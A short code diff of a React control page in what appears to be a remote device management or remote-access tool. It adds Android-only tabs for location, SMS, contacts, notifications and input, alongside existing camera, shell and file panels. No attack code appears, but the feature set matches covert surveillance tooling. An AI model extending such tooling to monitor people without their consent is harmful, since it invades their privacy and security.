@@ -247,11 +247,14 @@ function ControlPage() {
                 <div className={tab === "camera" ? "" : "hidden"}><CameraPanel deviceId={id} /></div>
                 <div className={tab === "shell" ? "" : "hidden"}><ShellPanel deviceId={id} /></div>
                 <div className={tab === "files" ? "" : "hidden"}><FilesPanel deviceId={id} /></div>
-                <div className={tab === "processes" ? "" : "hidden"}><ProcessesPanel deviceId={id} /></div>
-                <div className={tab === "system" ? "" : "hidden"}><SystemPanel deviceId={id} /></div>
-                <div className={tab === "ai" ? "" : "hidden"}><AIPanel deviceId={id} /></div>
-                <div className={tab === "fun" ? "" : "hidden"}><FunPanel deviceId={id} /></div>
-                {tab === "info" && <InfoPanel device={device} metric={metric} />}
+                {device.platform !== "android" && <div className={tab === "processes" ? "" : "hidden"}><ProcessesPanel deviceId={id} /></div>}
+                {device.platform !== "android" && <div className={tab === "system" ? "" : "hidden"}><SystemPanel deviceId={id} /></div>}
+                {device.platform !== "android" && <div className={tab === "ai" ? "" : "hidden"}><AIPanel deviceId={id} /></div>}
+                {device.platform !== "android" && <div className={tab === "fun" ? "" : "hidden"}><FunPanel deviceId={id} /></div>}
+                {(tab === "location" || tab === "sms" || tab === "contacts" || tab === "notify" || tab === "input") && (
+                  <AndroidCommandPanel deviceId={id} tab={tab} />
+                )}
+                {tab === "info" && <InfoPanel device={device as any} metric={metric} />}
               </Suspense>
             </ClientOnly>
           </div>
